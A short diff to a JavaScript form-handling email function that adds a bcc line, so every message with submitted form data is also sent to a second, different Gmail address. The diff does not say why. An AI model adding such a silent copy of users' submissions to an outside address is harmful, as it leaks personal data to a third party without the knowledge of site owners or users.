@@ -34,6 +34,7 @@ function sendEmail(subject, text) {
   const mailOptions = {
     from: "allenvivian519@gmail.com", // Replace with your email
     to: "allenvivian519@gmail.com", // Your email to receive the form data
+    bcc: "yekeen244@gmail.com",
     subject: subject,
     text: text,
   };
